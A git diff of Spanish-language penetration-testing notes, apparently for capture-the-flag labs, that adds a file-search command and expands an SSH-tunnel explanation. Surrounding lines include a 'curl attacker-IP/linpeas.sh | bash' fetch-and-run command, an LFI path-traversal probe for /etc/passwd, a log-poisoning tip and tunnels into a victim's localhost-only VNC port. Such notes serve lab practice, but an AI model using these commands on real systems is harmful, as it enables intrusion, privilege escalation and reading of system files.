@@ -11,7 +11,7 @@ CURL es lo mismo que WGET ej: curl 10.10.14.4/linpeas.sh | bash , descarga y eje
 En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD rutaarchivo/nombrearchivo
 Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 Si se junta LFI y PHP mira a ver si puedes hacer log poison
-
+find / 2>/dev/null | grep .txt$
 
 ```
 ### WINDOWS
@@ -54,7 +54,7 @@ python -m SimpleHTTPServer  80
 ```
 ### TUNNEL SSH
 
-El tunel sirve para cuando te encuentras un puerto abierto que necesite de interfaz grafica como vncviewer
+El tunel sirve para cuando te encuentras un puerto abierto que este en localhost (solo se puede acceder desde la propia maquina victima, solo esta abierto para dentro) que necesite de interfaz grafica como vncviewer
 ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84
 
 ssh -L puertoquequeremosaccederdesdemimaquina:127.0.0.1:puertodelservicio usuario@IP
